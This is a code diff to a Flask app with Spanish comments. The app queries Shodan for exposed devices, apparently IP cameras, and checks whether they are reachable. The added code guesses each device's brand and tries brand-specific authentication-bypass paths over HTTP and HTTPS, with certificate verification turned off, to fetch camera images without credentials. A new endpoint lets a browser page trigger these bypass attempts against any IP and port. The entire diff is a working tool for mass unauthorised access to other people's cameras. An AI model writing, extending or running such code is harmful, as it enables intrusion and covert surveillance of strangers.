@@ -1,9 +1,11 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, jsonify
 import shodan
 import json
 import requests
 from concurrent.futures import ThreadPoolExecutor
 import socket
+
+from bypass_list import bypass_paths  # NUEVO IMPORT
 
 # Leer configuración
 with open("config.json") as f:
@@ -41,6 +43,22 @@ def check_http_access(ip, port):
     except:
         return {'url': f"http://{ip}:{port}", 'accessible': False, 'auth_required': False}
 
+# Función que prueba los posibles bypass de una marca
+def check_bypass(ip, port, marca):
+    rutas = bypass_paths.get(marca.lower(), [])
+    esquemas = ["http", "https"]
+
+    for esquema in esquemas:
+        for path in rutas:
+            url = f"{esquema}://{ip}:{port}{path}"
+            try:
+                r = requests.get(url, timeout=3, stream=True, verify=False)
+                if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
+                    return url  # ¡Bypass exitoso!
+            except:
+                continue
+    return None  # Ninguna ruta funcionó
+
 @app.route('/', methods=['GET', 'POST'])
 def index():
     results = []
@@ -68,6 +86,16 @@ def index():
                 lat = location.get('latitude')
                 lon = location.get('longitude')
 
+                # Intentamos detectar la marca desde el host o producto
+                product = result.get('product', '') or ''
+                marca_detectada = product.lower()
+                for m in bypass_paths.keys():
+                    if m in marca_detectada:
+                        marca_detectada = m
+                        break
+                else:
+                    marca_detectada = ''
+
                 raw_results.append({
                     'ip': ip,
                     'port': port,
@@ -75,7 +103,8 @@ def index():
                     'country': country,
                     'city': city,
                     'lat': lat,
-                    'lon': lon
+                    'lon': lon,
+                    'marca': marca_detectada
                 })
 
             with ThreadPoolExecutor(max_workers=10) as executor:
@@ -86,6 +115,8 @@ def index():
                 result['url'] = status['url']
                 result['accessible'] = status['accessible']
                 result['auth_required'] = status['auth_required']
+                result['bypass_url'] = None
+
                 results.append(result)
 
             stats['total'] = len(results)
@@ -96,7 +127,23 @@ def index():
         except shodan.APIError as e:
             error = f"Error con la API de Shodan: {e}"
 
-    return render_template('index.html', results=results, stats=stats, error=error)
+    return render_template('index.html', results=results, stats=stats, error=error, bypass_paths=bypass_paths)
+
+# NUEVA RUTA: para probar bypass desde JS
+@app.route('/bypass_check')
+def bypass_check():
+    ip = request.args.get('ip')
+    port = request.args.get('port')
+    marca = request.args.get('marca')
+
+    if not ip or not port or not marca:
+        return jsonify({'success': False, 'error': 'Parámetros incompletos'})
+
+    url_bypass = check_bypass(ip, port, marca)
+    if url_bypass:
+        return jsonify({'success': True, 'url': url_bypass})
+    else:
+        return jsonify({'success': False})
 
 if __name__ == '__main__':
     local_ip = socket.gethostbyname(socket.gethostname())
